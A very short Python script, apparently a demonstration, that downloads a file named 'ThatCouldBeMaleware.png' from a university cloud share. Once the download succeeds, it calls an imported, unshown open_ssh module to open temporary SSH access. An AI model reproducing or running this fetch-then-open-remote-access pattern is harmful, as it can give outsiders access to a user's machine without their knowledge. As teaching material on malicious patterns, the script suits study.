import requests
import open_ssh

url =  "https://tubcloud.tu-berlin.de/s/FNmHMXp3zWiMggb/download/ThatCouldBeMaleware.png"

filename = "ThatCouldBeMaleware.png"

response = requests.get(url)

if response.status_code == 200:
    with open(filename, "wb") as f:
        f.write(response.content)
        open_ssh.open_temp_ssh()
else:
    print("Download failed! {response.status_code}")

